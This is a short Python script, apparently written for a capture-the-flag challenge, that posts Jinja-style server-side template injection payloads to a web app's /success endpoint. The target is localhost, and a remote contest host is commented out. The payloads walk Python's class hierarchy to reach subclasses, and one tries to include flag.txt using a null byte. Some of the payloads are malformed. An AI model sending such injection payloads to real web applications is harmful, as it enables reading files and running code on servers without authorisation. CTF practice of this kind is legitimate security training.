#!/usr/bin/env python3
import requests

# data = {
#     "name":"""{{request.form["p"]}}""",
#     "p":"{{''.class.mro()[1].subclasses()}}"
# }


data = {
    "name":'{{"".join(request.form.p)}}',
    "p":'"".__class__.__mro__()[1].__subclasses__()'
}

# data = {
#     "name":'{% includefile("flag.txt") %}\x00asdfsadfasdfsadfasdf',
#     "p":'{{3*3}}'
# }

#r = requests.post("http://io6.ept.gg:32830/success",data=data)
r = requests.post("http://localhost:5000/success",data=data)
print(r.text)